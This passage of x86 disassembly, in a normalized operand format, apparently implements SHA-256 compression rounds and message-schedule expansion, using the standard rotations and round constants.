mov [ ebp + 0xc ] ecx
mov edi esi
ror edi 0xd
mov ecx esi
rol ecx 0xa
xor edi ecx
mov ecx esi
ror ecx 0x2
xor edi ecx
mov ecx esi
or ecx edx
and ecx [ ebp - 0xc ]
mov ebx esi
and ebx edx
or ecx ebx
add edi [ ebp + 0xc ]
add ecx edi
mov edx [ ebp - 0x10 ]
mov edi [ ebp - 0x10 ]
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi [ ebp - 0x10 ]
ror edi 0x6
xor edx edi
add edx [ eax + 0x1c ]
mov edi [ eax + 0x18 ]
xor edi [ ebp + 0x8 ]
mov ebx ecx
and edi [ ebp - 0x10 ]
xor edi [ eax + 0x18 ]
add edi edx
mov edx [ ebp - 0x114 ]
lea edx [ edi + edx - 0x4a3f0431 ]
add [ ebp - 0xc ] edx
mov [ ebp + 0xc ] edx
mov edi ecx
ror edi 0xd
mov edx ecx
rol edx 0xa
xor edi edx
mov edx ecx
ror edx 0x2
xor edi edx
add edi [ ebp + 0xc ]
mov edx esi
and esi ecx
or edx ecx
and edx [ ebp - 0x18 ]
or edx esi
mov esi [ ebp - 0xc ]
add edx edi
mov edi [ ebp - 0xc ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0xc ]
ror edi 0x6
xor esi edi
add esi [ eax + 0x18 ]
mov edi [ ebp + 0x8 ]
xor edi [ ebp - 0x10 ]
and ebx edx
and edi [ ebp - 0xc ]
xor edi [ ebp + 0x8 ]
add edi esi
mov esi [ ebp - 0x110 ]
lea esi [ edi + esi - 0x164a245b ]
add [ ebp - 0x18 ] esi
mov [ ebp + 0xc ] esi
mov edi edx
ror edi 0xd
mov esi edx
rol esi 0xa
xor edi esi
mov esi edx
ror esi 0x2
xor edi esi
add edi [ ebp + 0xc ]
mov esi ecx
or esi edx
and esi [ ebp - 0x8 ]
or esi ebx
add esi edi
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x18 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x18 ]
ror edi 0x6
xor esi edi
mov edi [ ebp - 0x10 ]
xor edi [ ebp - 0xc ]
and edi [ ebp - 0x18 ]
xor edi [ ebp - 0x10 ]
add esi [ ebp + 0x8 ]
mov [ ebp + 0x8 ] edx
add edi esi
mov esi [ ebp - 0x10c ]
lea esi [ edi + esi + 0x3956c25b ]
add [ ebp - 0x8 ] esi
mov [ ebp + 0xc ] esi
mov esi [ ebp - 0x4 ]
or [ ebp + 0x8 ] esi
and [ ebp + 0x8 ] ecx
mov edi esi
ror edi 0xd
mov ebx esi
rol ebx 0xa
xor edi ebx
mov ebx esi
ror ebx 0x2
xor edi ebx
add edi [ ebp + 0xc ]
mov ebx edx
and ebx esi
mov esi [ ebp + 0x8 ]
or esi ebx
add esi edi
mov edi [ ebp - 0x8 ]
mov [ ebp + 0x8 ] esi
mov esi [ ebp - 0x8 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x8 ]
ror edi 0x6
xor esi edi
add esi [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
xor edi [ ebp - 0x18 ]
and edi [ ebp - 0x8 ]
xor edi [ ebp - 0xc ]
add edi esi
mov esi [ ebp - 0x108 ]
lea esi [ edi + esi + 0x59f111f1 ]
add ecx esi
mov [ ebp + 0xc ] esi
mov esi [ ebp + 0x8 ]
mov ebx esi
mov edi esi
ror ebx 0xd
rol edi 0xa
xor ebx edi
mov edi esi
ror edi 0x2
xor ebx edi
mov edi [ ebp - 0x4 ]
add ebx [ ebp + 0xc ]
or edi esi
and edi edx
mov [ ebp - 0x14 ] edi
mov edi [ ebp - 0x4 ]
and edi esi
mov esi [ ebp - 0x14 ]
or esi edi
add esi ebx
mov [ ebp - 0x10 ] esi
mov esi ecx
ror esi 0xb
mov edi ecx
rol edi 0x7
xor esi edi
mov edi ecx
ror edi 0x6
xor esi edi
mov edi [ ebp - 0x8 ]
xor edi [ ebp - 0x18 ]
add esi [ ebp - 0xc ]
and edi ecx
xor edi [ ebp - 0x18 ]
mov [ ebp - 0x1c ] ecx
add edi esi
mov esi [ ebp - 0x104 ]
lea esi [ edi + esi - 0x6dc07d5c ]
mov [ ebp + 0xc ] esi
add edx esi
mov edi [ ebp - 0x10 ]
mov ebx edi
ror ebx 0xd
mov esi edi
rol esi 0xa
xor ebx esi
mov esi edi
ror esi 0x2
xor ebx esi
add ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
or esi edi
and esi [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
and edi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] edx
or esi edi
add esi ebx
mov [ ebp - 0xc ] esi
mov esi edx
ror esi 0xb
mov edi edx
rol edi 0x7
xor esi edi
mov edi edx
ror edi 0x6
xor esi edi
add esi [ ebp - 0x18 ]
mov edi [ ebp - 0x8 ]
xor edi ecx
and edi edx
xor edi [ ebp - 0x8 ]
add edi esi
mov esi [ ebp - 0x100 ]
lea esi [ edi + esi - 0x54e3a12b ]
add [ ebp - 0x4 ] esi
mov edi [ ebp - 0xc ]
mov [ ebp + 0xc ] esi
mov ebx edi
ror ebx 0xd
mov esi edi
rol esi 0xa
xor ebx esi
mov esi edi
ror esi 0x2
xor ebx esi
add ebx [ ebp + 0xc ]
mov esi [ ebp - 0x10 ]
or esi edi
and esi [ ebp + 0x8 ]
mov edi [ ebp - 0x10 ]
and edi [ ebp - 0xc ]
or esi edi
add esi ebx
mov [ ebp - 0x18 ] esi
mov esi [ ebp - 0x4 ]
mov edi esi
ror edi 0xb
mov ebx esi
rol ebx 0x7
xor edi ebx
mov ebx esi
ror ebx 0x6
xor edi ebx
add edi [ ebp - 0x8 ]
mov ebx ecx
xor ebx edx
and ebx esi
mov esi [ ebp - 0x18 ]
xor ebx ecx
mov ecx [ ebp - 0xfc ]
add ebx edi
lea ecx [ ebx + ecx - 0x27f85568 ]
add [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] ecx
mov edi esi
ror edi 0xd
mov ecx esi
rol ecx 0xa
xor edi ecx
mov ecx esi
mov ebx [ ebp - 0xc ]
and ebx esi
ror ecx 0x2
xor edi ecx
add edi [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
or ecx esi
and ecx [ ebp - 0x10 ]
mov esi [ ebp + 0x8 ]
or ecx ebx
add ecx edi
mov edi [ ebp + 0x8 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp + 0x8 ]
ror edi 0x6
xor esi edi
add esi [ ebp - 0x1c ]
mov edi edx
xor edi [ ebp - 0x4 ]
mov ebx ecx
and edi [ ebp + 0x8 ]
xor edi edx
add edi esi
mov edx [ ebp - 0xf8 ]
lea edx [ edi + edx + 0x12835b01 ]
add [ ebp - 0x10 ] edx
mov [ ebp + 0xc ] edx
mov esi ecx
ror esi 0xd
mov edx ecx
rol edx 0xa
xor esi edx
mov edx ecx
ror edx 0x2
xor esi edx
add esi [ ebp + 0xc ]
mov edx ecx
or edx [ ebp - 0x18 ]
mov edi ecx
and edi [ ebp - 0x18 ]
and edx [ ebp - 0xc ]
or edx edi
mov edi [ ebp - 0x10 ]
add edx esi
mov esi [ ebp - 0x10 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x10 ]
ror edi 0x6
xor esi edi
add esi [ ebp - 0x14 ]
mov edi [ ebp - 0x4 ]
xor edi [ ebp + 0x8 ]
and ebx edx
and edi [ ebp - 0x10 ]
xor edi [ ebp - 0x4 ]
add edi esi
mov esi [ ebp - 0xf4 ]
lea esi [ edi + esi + 0x243185be ]
add [ ebp - 0xc ] esi
mov [ ebp + 0xc ] esi
mov edi edx
ror edi 0xd
mov esi edx
rol esi 0xa
xor edi esi
mov esi edx
ror esi 0x2
xor edi esi
add edi [ ebp + 0xc ]
mov esi ecx
or esi edx
and esi [ ebp - 0x18 ]
or esi ebx
add esi edi
mov [ ebp - 0x14 ] esi
mov esi [ ebp - 0xc ]
ror esi 0xb
mov edi [ ebp - 0xc ]
rol edi 0x7
xor esi edi
mov edi [ ebp - 0xc ]
ror edi 0x6
xor esi edi
add esi [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
xor edi [ ebp - 0x10 ]
mov [ ebp - 0x8 ] edx
and edi [ ebp - 0xc ]
xor edi [ ebp + 0x8 ]
add edi esi
mov esi [ ebp - 0xf0 ]
lea esi [ edi + esi + 0x550c7dc3 ]
add [ ebp - 0x18 ] esi
mov [ ebp + 0xc ] esi
mov esi [ ebp - 0x14 ]
or [ ebp - 0x8 ] esi
and [ ebp - 0x8 ] ecx
mov edi esi
ror edi 0xd
mov ebx esi
rol ebx 0xa
xor edi ebx
mov ebx esi
ror ebx 0x2
xor edi ebx
add edi [ ebp + 0xc ]
mov ebx edx
and ebx esi
mov esi [ ebp - 0x8 ]
or esi ebx
add esi edi
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x18 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x18 ]
ror edi 0x6
xor esi edi
add esi [ ebp + 0x8 ]
mov edi [ ebp - 0x10 ]
xor edi [ ebp - 0xc ]
and edi [ ebp - 0x18 ]
xor edi [ ebp - 0x10 ]
add edi esi
mov esi [ ebp - 0xec ]
lea esi [ edi + esi + 0x72be5d74 ]
add ecx esi
mov [ ebp + 0xc ] esi
mov esi [ ebp - 0x4 ]
mov ebx esi
ror ebx 0xd
mov edi esi
rol edi 0xa
xor ebx edi
mov edi esi
ror edi 0x2
xor ebx edi
mov edi [ ebp - 0x14 ]
add ebx [ ebp + 0xc ]
or edi esi
and edi edx
mov [ ebp + 0x8 ] edi
mov edi [ ebp - 0x14 ]
and edi esi
mov esi [ ebp + 0x8 ]
or esi edi
add esi ebx
mov [ ebp + 0x8 ] esi
mov esi ecx
ror esi 0xb
mov edi ecx
rol edi 0x7
xor esi edi
mov edi ecx
ror edi 0x6
xor esi edi
add esi [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
xor edi [ ebp - 0x18 ]
and edi ecx
xor edi [ ebp - 0xc ]
add edi esi
mov esi [ ebp - 0xe8 ]
lea esi [ edi + esi - 0x7f214e02 ]
add edx esi
mov edi [ ebp + 0x8 ]
mov [ ebp + 0xc ] esi
mov ebx edi
ror ebx 0xd
mov esi edi
rol esi 0xa
xor ebx esi
mov esi edi
ror esi 0x2
xor ebx esi
add ebx [ ebp + 0xc ]
mov esi [ ebp - 0x4 ]
or esi edi
and esi [ ebp - 0x14 ]
mov edi [ ebp - 0x4 ]
and edi [ ebp + 0x8 ]
or esi edi
add esi ebx
mov [ ebp - 0x10 ] esi
mov esi edx
ror esi 0xb
mov edi edx
rol edi 0x7
xor esi edi
mov edi edx
ror edi 0x6
xor esi edi
add esi [ ebp - 0xc ]
mov edi ecx
xor edi [ ebp - 0x18 ]
and edi edx
xor edi [ ebp - 0x18 ]
add edi esi
mov esi [ ebp - 0xe4 ]
lea esi [ edi + esi - 0x6423f959 ]
add [ ebp - 0x14 ] esi
mov edi [ ebp - 0x10 ]
mov [ ebp + 0xc ] esi
mov ebx edi
ror ebx 0xd
mov esi edi
rol esi 0xa
xor ebx esi
mov esi edi
ror esi 0x2
xor ebx esi
add ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
or esi edi
and esi [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
and edi [ ebp - 0x10 ]
or esi edi
add esi ebx
mov [ ebp - 0xc ] esi
mov esi [ ebp - 0x14 ]
mov edi esi
ror edi 0xb
mov ebx esi
rol ebx 0x7
xor edi ebx
mov ebx esi
ror ebx 0x6
xor edi ebx
add edi [ ebp - 0x18 ]
mov ebx ecx
xor ebx edx
and ebx esi
mov esi [ ebp - 0xe0 ]
xor ebx ecx
add ebx edi
lea esi [ ebx + esi - 0x3e640e8c ]
add [ ebp - 0x4 ] esi
mov edi [ ebp - 0xc ]
mov [ ebp + 0xc ] esi
mov ebx edi
mov esi edi
ror ebx 0xd
rol esi 0xa
xor ebx esi
mov esi edi
ror esi 0x2
xor ebx esi
add ebx [ ebp + 0xc ]
mov esi [ ebp - 0x10 ]
or esi edi
and esi [ ebp + 0x8 ]
mov edi [ ebp - 0x10 ]
and edi [ ebp - 0xc ]
or esi edi
add esi ebx
mov edi [ ebp - 0xe4 ]
mov [ ebp - 0x18 ] esi
mov esi [ ebp - 0xe4 ]
rol edi 0xf
rol esi 0xd
xor edi esi
mov esi [ ebp - 0xe4 ]
mov ebx [ ebp - 0x118 ]
shr esi 0xa
xor edi esi
add edi [ ebp - 0xf8 ]
mov esi [ ebp - 0x118 ]
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ ebp - 0x118 ]
shr ebx 0x3
xor esi ebx
add esi edi
add esi [ ebp - 0x11c ]
mov edi [ ebp - 0x4 ]
mov [ ebp - 0xdc ] esi
mov esi [ ebp - 0x4 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x4 ]
ror edi 0x6
xor esi edi
add esi [ ebp - 0xdc ]
mov ebx [ ebp - 0xc ]
mov edi edx
xor edi [ ebp - 0x14 ]
and edi [ ebp - 0x4 ]
xor edi edx
add edi esi
lea ecx [ edi + ecx - 0x1b64963f ]
add [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] ecx
mov ecx [ ebp - 0x18 ]
mov edi ecx
ror edi 0xd
mov esi ecx
rol esi 0xa
xor edi esi
mov esi ecx
ror esi 0x2
xor edi esi
mov esi [ ebp - 0xc ]
add edi [ ebp + 0xc ]
or esi ecx
and esi [ ebp - 0x10 ]
and ebx ecx
mov ecx [ ebp - 0xe0 ]
or esi ebx
add esi edi
mov edi [ ebp - 0xe0 ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0xe0 ]
shr ecx 0xa
xor edi ecx
add edi [ ebp - 0xf4 ]
mov ecx [ ebp - 0x114 ]
mov ebx [ ebp - 0x114 ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0x114 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0x118 ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0xd8 ] ecx
mov ecx [ ebp + 0x8 ]
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi [ ebp + 0x8 ]
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0xd8 ]
mov edi [ ebp - 0x14 ]
xor edi [ ebp - 0x4 ]
mov ebx [ ebp - 0x110 ]
and edi [ ebp + 0x8 ]
xor edi [ ebp - 0x14 ]
add edi ecx
lea edx [ edi + edx - 0x1041b87a ]
add [ ebp - 0x10 ] edx
mov [ ebp + 0xc ] edx
mov edx esi
ror edx 0xd
mov ecx esi
rol ecx 0xa
xor edx ecx
mov ecx esi
ror ecx 0x2
xor edx ecx
add edx [ ebp + 0xc ]
mov ecx esi
or ecx [ ebp - 0x18 ]
mov edi esi
and edi [ ebp - 0x18 ]
and ecx [ ebp - 0xc ]
or ecx edi
mov edi [ ebp - 0xdc ]
add ecx edx
mov edx [ ebp - 0xdc ]
rol edi 0xf
rol edx 0xd
xor edi edx
mov edx [ ebp - 0xdc ]
shr edx 0xa
xor edi edx
add edi [ ebp - 0xf0 ]
mov edx [ ebp - 0x110 ]
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ ebp - 0x110 ]
shr ebx 0x3
xor edx ebx
add edx edi
add edx [ ebp - 0x114 ]
mov edi [ ebp - 0x10 ]
mov [ ebp - 0xd4 ] edx
mov edx [ ebp - 0x10 ]
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi [ ebp - 0x10 ]
ror edi 0x6
xor edx edi
mov edi [ ebp - 0x4 ]
xor edi [ ebp + 0x8 ]
add edx [ ebp - 0xd4 ]
and edi [ ebp - 0x10 ]
xor edi [ ebp - 0x4 ]
add edi edx
mov edx [ ebp - 0x14 ]
lea edx [ edi + edx + 0xfc19dc6 ]
add [ ebp - 0xc ] edx
mov [ ebp + 0xc ] edx
mov edi ecx
ror edi 0xd
mov edx ecx
rol edx 0xa
xor edi edx
mov edx ecx
ror edx 0x2
xor edi edx
add edi [ ebp + 0xc ]
mov edx esi
or edx ecx
and edx [ ebp - 0x18 ]
mov ebx esi
and ebx ecx
or edx ebx
add edx edi
mov edi [ ebp - 0xd8 ]
rol edi 0xf
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0xd8 ]
rol edx 0xd
xor edi edx
mov edx [ ebp - 0xd8 ]
mov ebx [ ebp - 0x10c ]
shr edx 0xa
xor edi edx
add edi [ ebp - 0xec ]
mov edx [ ebp - 0x10c ]
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ ebp - 0x10c ]
shr ebx 0x3
xor edx ebx
add edx edi
add edx [ ebp - 0x110 ]
mov edi [ ebp - 0xc ]
mov [ ebp - 0xd0 ] edx
mov edx [ ebp - 0xc ]
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi [ ebp - 0xc ]
ror edi 0x6
xor edx edi
add edx [ ebp - 0xd0 ]
mov edi [ ebp + 0x8 ]
xor edi [ ebp - 0x10 ]
mov [ ebp - 0x8 ] ecx
and edi [ ebp - 0xc ]
xor edi [ ebp + 0x8 ]
add edi edx
mov edx [ ebp - 0x4 ]
lea edx [ edi + edx + 0x240ca1cc ]
add [ ebp - 0x18 ] edx
mov [ ebp + 0xc ] edx
mov edx [ ebp - 0x14 ]
or [ ebp - 0x8 ] edx
and [ ebp - 0x8 ] esi
mov edi edx
ror edi 0xd
mov ebx edx
rol ebx 0xa
xor edi ebx
mov ebx edx
ror ebx 0x2
xor edi ebx
add edi [ ebp + 0xc ]
mov ebx ecx
and ebx edx
mov edx [ ebp - 0x8 ]
or edx ebx
add edx edi
mov edi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0xd4 ]
rol edi 0xf
rol edx 0xd
xor edi edx
mov edx [ ebp - 0xd4 ]
shr edx 0xa
xor edi edx
add edi [ ebp - 0xe8 ]
mov edx [ ebp - 0x108 ]
rol edx 0xe
mov ebx [ ebp - 0x108 ]
ror ebx 0x7
xor edx ebx
mov ebx [ ebp - 0x108 ]
shr ebx 0x3
xor edx ebx
add edx edi
add edx [ ebp - 0x10c ]
mov edi [ ebp - 0x18 ]
mov [ ebp - 0xcc ] edx
mov edx [ ebp - 0x18 ]
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi [ ebp - 0x18 ]
ror edi 0x6
xor edx edi
add edx [ ebp - 0xcc ]
mov edi [ ebp - 0x10 ]
xor edi [ ebp - 0xc ]
and edi [ ebp - 0x18 ]
xor edi [ ebp - 0x10 ]
add edi edx
mov edx [ ebp + 0x8 ]
lea edx [ edi + edx + 0x2de92c6f ]
add esi edx
mov [ ebp + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov ebx edx
mov edi edx
ror ebx 0xd
rol edi 0xa
xor ebx edi
mov edi edx
ror edi 0x2
xor ebx edi
mov edi [ ebp - 0x14 ]
add ebx [ ebp + 0xc ]
or edi edx
and edi ecx
mov [ ebp + 0x8 ] edi
mov edi [ ebp - 0x14 ]
and edi edx
mov edx [ ebp + 0x8 ]
or edx edi
mov edi [ ebp - 0xd0 ]
add edx ebx
mov ebx [ ebp - 0x104 ]
mov [ ebp + 0x8 ] edx
mov edx [ ebp - 0xd0 ]
rol edi 0xf
rol edx 0xd
xor edi edx
mov edx [ ebp - 0xd0 ]
shr edx 0xa
xor edi edx
mov edx [ ebp - 0x104 ]
add edi [ ebp - 0xe4 ]
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ ebp - 0x104 ]
shr ebx 0x3
xor edx ebx
add edx edi
add edx [ ebp - 0x108 ]
mov edi esi
mov [ ebp - 0xc8 ] edx
mov edx esi
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi esi
ror edi 0x6
xor edx edi
add edx [ ebp - 0xc8 ]
mov edi [ ebp - 0xc ]
xor edi [ ebp - 0x18 ]
and edi esi
xor edi [ ebp - 0xc ]
add edi edx
mov edx [ ebp - 0x10 ]
lea edx [ edi + edx + 0x4a7484aa ]
add ecx edx
mov edi [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
mov ebx edi
ror ebx 0xd
mov edx edi
rol edx 0xa
xor ebx edx
mov edx edi
ror edx 0x2
xor ebx edx
add ebx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
or edx edi
and edx [ ebp - 0x14 ]
mov edi [ ebp - 0x4 ]
and edi [ ebp + 0x8 ]
or edx edi
add edx ebx
mov edi [ ebp - 0xcc ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0xcc ]
mov ebx [ ebp - 0x100 ]
rol edi 0xf
rol edx 0xd
xor edi edx
mov edx [ ebp - 0xcc ]
shr edx 0xa
xor edi edx
add edi [ ebp - 0xe0 ]
mov edx [ ebp - 0x100 ]
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ ebp - 0x100 ]
shr ebx 0x3
xor edx ebx
add edx edi
add edx [ ebp - 0x104 ]
mov edi ecx
mov [ ebp - 0xc4 ] edx
mov edx ecx
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi ecx
ror edi 0x6
xor edx edi
add edx [ ebp - 0xc4 ]
mov edi esi
xor edi [ ebp - 0x18 ]
and edi ecx
xor edi [ ebp - 0x18 ]
add edi edx
mov edx [ ebp - 0xc ]
lea edx [ edi + edx + 0x5cb0a9dc ]
add [ ebp - 0x14 ] edx
mov edi [ ebp - 0x10 ]
mov [ ebp + 0xc ] edx
mov ebx edi
ror ebx 0xd
mov edx edi
rol edx 0xa
xor ebx edx
mov edx edi
ror edx 0x2
xor ebx edx
mov edx [ ebp + 0x8 ]
or edx edi
and edx [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
add ebx [ ebp + 0xc ]
and edi [ ebp - 0x10 ]
or edx edi
add edx ebx
mov [ ebp - 0xc ] edx
mov edi [ ebp - 0xc8 ]
mov edx [ ebp - 0xc8 ]
rol edi 0xf
rol edx 0xd
xor edi edx
mov edx [ ebp - 0xc8 ]
shr edx 0xa
xor edi edx
add edi [ ebp - 0xdc ]
mov edx [ ebp - 0xfc ]
mov ebx [ ebp - 0xfc ]
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ ebp - 0xfc ]
shr ebx 0x3
xor edx ebx
add edx edi
add edx [ ebp - 0x100 ]
mov [ ebp - 0xc0 ] edx
mov edx [ ebp - 0x14 ]
mov edi edx
mov ebx edx
ror edi 0xb
rol ebx 0x7
xor edi ebx
mov ebx edx
ror ebx 0x6
xor edi ebx
add edi [ ebp - 0xc0 ]
mov ebx esi
xor ebx ecx
and ebx edx
mov edx [ ebp - 0x18 ]
xor ebx esi
add ebx edi
mov edi [ ebp - 0xc ]
lea edx [ ebx + edx + 0x76f988da ]
add [ ebp - 0x4 ] edx
mov [ ebp + 0xc ] edx
mov ebx edi
ror ebx 0xd
mov edx edi
rol edx 0xa
xor ebx edx
mov edx edi
ror edx 0x2
xor ebx edx
add ebx [ ebp + 0xc ]
mov edx [ ebp - 0x10 ]
or edx edi
and edx [ ebp + 0x8 ]
mov edi [ ebp - 0x10 ]
and edi [ ebp - 0xc ]
or edx edi
mov edi [ ebp - 0xc4 ]
add edx ebx
mov ebx [ ebp - 0xf8 ]
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0xc4 ]
rol edi 0xf
rol edx 0xd
xor edi edx
mov edx [ ebp - 0xc4 ]
shr edx 0xa
xor edi edx
mov edx [ ebp - 0xf8 ]
add edi [ ebp - 0xd8 ]
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ ebp - 0xf8 ]
shr ebx 0x3
xor edx ebx
add edx edi
add edx [ ebp - 0xfc ]
mov edi [ ebp - 0x4 ]
mov [ ebp - 0xbc ] edx
mov edx [ ebp - 0x4 ]
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi [ ebp - 0x4 ]
ror edi 0x6
xor edx edi
add edx [ ebp - 0xbc ]
mov edi ecx
xor edi [ ebp - 0x14 ]
mov ebx [ ebp - 0xc ]
and edi [ ebp - 0x4 ]
xor edi ecx
add edi edx
lea esi [ edi + esi - 0x67c1aeae ]
add [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] esi
mov esi [ ebp - 0x18 ]
mov edi esi
ror edi 0xd
mov edx esi
rol edx 0xa
xor edi edx
mov edx esi
and ebx esi
ror edx 0x2
xor edi edx
add edi [ ebp + 0xc ]
mov edx [ ebp - 0xc ]
or edx esi
and edx [ ebp - 0x10 ]
mov esi [ ebp - 0xc0 ]
or edx ebx
add edx edi
mov edi [ ebp - 0xc0 ]
mov ebx [ ebp - 0xf4 ]
rol edi 0xf
rol esi 0xd
xor edi esi
mov esi [ ebp - 0xc0 ]
shr esi 0xa
xor edi esi
add edi [ ebp - 0xd4 ]
mov esi [ ebp - 0xf4 ]
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ ebp - 0xf4 ]
shr ebx 0x3
xor esi ebx
add esi edi
add esi [ ebp - 0xf8 ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0xb8 ] esi
mov esi [ ebp + 0x8 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp + 0x8 ]
ror edi 0x6
xor esi edi
mov edi [ ebp - 0x14 ]
xor edi [ ebp - 0x4 ]
add esi [ ebp - 0xb8 ]
and edi [ ebp + 0x8 ]
xor edi [ ebp - 0x14 ]
add edi esi
lea ecx [ edi + ecx - 0x57ce3993 ]
add [ ebp - 0x10 ] ecx
mov [ ebp + 0xc ] ecx
mov ecx edx
ror ecx 0xd
mov esi edx
rol esi 0xa
xor ecx esi
mov esi edx
ror esi 0x2
xor ecx esi
mov esi edx
add ecx [ ebp + 0xc ]
or esi [ ebp - 0x18 ]
mov ebx [ ebp - 0xf0 ]
and esi [ ebp - 0xc ]
mov edi edx
and edi [ ebp - 0x18 ]
or esi edi
add esi ecx
mov edi [ ebp - 0xbc ]
mov ecx [ ebp - 0xbc ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0xbc ]
shr ecx 0xa
xor edi ecx
add edi [ ebp - 0xd0 ]
mov ecx [ ebp - 0xf0 ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0xf0 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0xf4 ]
mov edi [ ebp - 0x10 ]
mov [ ebp - 0xb4 ] ecx
mov ecx [ ebp - 0x10 ]
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi [ ebp - 0x10 ]
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0xb4 ]
mov edi [ ebp - 0x4 ]
xor edi [ ebp + 0x8 ]
mov ebx edx
and edi [ ebp - 0x10 ]
and ebx esi
xor edi [ ebp - 0x4 ]
add edi ecx
mov ecx [ ebp - 0x14 ]
lea ecx [ edi + ecx - 0x4ffcd838 ]
add [ ebp - 0xc ] ecx
mov [ ebp + 0xc ] ecx
mov edi esi
ror edi 0xd
mov ecx esi
rol ecx 0xa
xor edi ecx
mov ecx esi
ror ecx 0x2
xor edi ecx
add edi [ ebp + 0xc ]
mov ecx edx
or ecx esi
and ecx [ ebp - 0x18 ]
or ecx ebx
mov ebx [ ebp - 0xec ]
add ecx edi
mov edi [ ebp - 0xb8 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0xb8 ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0xb8 ]
shr ecx 0xa
xor edi ecx
mov ecx [ ebp - 0xec ]
add edi [ ebp - 0xcc ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0xec ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0xf0 ]
mov edi [ ebp - 0xc ]
mov [ ebp - 0xb0 ] ecx
mov ecx [ ebp - 0xc ]
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi [ ebp - 0xc ]
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0xb0 ]
mov edi [ ebp + 0x8 ]
xor edi [ ebp - 0x10 ]
mov [ ebp - 0x8 ] esi
and edi [ ebp - 0xc ]
xor edi [ ebp + 0x8 ]
add edi ecx
mov ecx [ ebp - 0x4 ]
lea ecx [ edi + ecx - 0x40a68039 ]
add [ ebp - 0x18 ] ecx
mov [ ebp + 0xc ] ecx
mov ecx [ ebp - 0x14 ]
or [ ebp - 0x8 ] ecx
and [ ebp - 0x8 ] edx
mov edi ecx
ror edi 0xd
mov ebx ecx
rol ebx 0xa
xor edi ebx
mov ebx ecx
ror ebx 0x2
xor edi ebx
add edi [ ebp + 0xc ]
mov ebx esi
and ebx ecx
mov ecx [ ebp - 0x8 ]
or ecx ebx
add ecx edi
mov edi [ ebp - 0xb4 ]
mov ebx [ ebp - 0xe8 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0xb4 ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0xb4 ]
shr ecx 0xa
xor edi ecx
add edi [ ebp - 0xc8 ]
mov ecx [ ebp - 0xe8 ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0xe8 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0xec ]
mov edi [ ebp - 0x18 ]
mov [ ebp - 0xac ] ecx
mov ecx [ ebp - 0x18 ]
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi [ ebp - 0x18 ]
ror edi 0x6
xor ecx edi
